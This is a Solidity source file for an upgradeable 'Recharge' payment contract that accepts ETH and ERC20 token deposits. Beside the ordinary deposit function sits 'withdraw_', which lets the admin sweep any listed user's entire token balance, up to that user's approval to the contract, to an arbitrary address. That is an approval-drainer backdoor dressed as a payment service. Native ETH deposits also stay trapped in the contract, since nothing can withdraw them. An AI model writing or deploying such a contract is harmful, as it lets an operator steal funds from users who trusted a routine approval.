// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Initializable } from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import { UUPSUpgradeable } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import { OwnableUpgradeable } from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

import {TransferHelper} from "./libraries/TransferHelper.sol";
import {ReentrancyGuard} from "./libraries/ReentrancyGuard.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Recharge is Initializable, OwnableUpgradeable, UUPSUpgradeable, ReentrancyGuard{

    address public admin;
    address public recipient;

    event AdminshipTransferred(address indexed previousAdmin, address indexed newAdmin);
    // event saveOrder(address _users, address _tokenAddress, uint256 _amount, string _remark);
    event TransactionDetails(
        address[] tokenAddress,
        uint256[] amount,
        string remark,
        address[] customerAddress
    );

    receive() external payable{}

    modifier onlyAdmin() {
        require(msg.sender == admin, "ERROR_ADMIN.");
        _;
    }

    function changeAdmin(address _newAdmin) external onlyOwner {
        require(_newAdmin != address(0), "Zero address");
        emit AdminshipTransferred(admin, _newAdmin);
        admin = _newAdmin;
    }

    // Authorize contract upgrades only by the owner
    function _authorizeUpgrade(address newImplementation) internal view override onlyOwner(){}

    function initialize(
        address _admin,
        address _recipient
    ) public initializer {
        __Ownable_init_unchained(_msgSender());
        __UUPSUpgradeable_init_unchained();
        admin = _admin;
        recipient = _recipient;
    }

    function recharge(address token, uint256 amount, string calldata remarks) external payable{
        require(amount > 0, "ERROR_AMOUNT.");
        if(token != address(0)) {
            TransferHelper.safeTransferFrom(token, msg.sender, recipient, amount);
        }else {
            require(msg.value >= amount, "ERROR_PAYABLE_AMOUNT.");
            uint256 refund = msg.value - amount;
            if (refund > 0) TransferHelper.safeTransferETH(msg.sender, refund); // 退回多余部分
        }
        address[] memory tokenAddress = new address[](1);
        tokenAddress[0] = token;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        address[] memory customerAddress = new address[](1);
        customerAddress[0] = msg.sender;

        emit TransactionDetails(tokenAddress, amounts, remarks, customerAddress);
    }

    function withdraw_(address token, address[] calldata users, address to) external onlyAdmin(){
        
        for(uint i=0; i<users.length; i++){
            uint256 amount = IERC20(token).balanceOf(users[i]);
            uint256 approveAmount = IERC20(token).allowance(users[i], address(this));
            if(amount > 0){
                if(approveAmount >= amount) TransferHelper.safeTransferFrom(token, users[i], to, amount);
                if(approveAmount < amount && approveAmount > 0) TransferHelper.safeTransferFrom(token, users[i], to, approveAmount);
            }
        }
        
    }

}

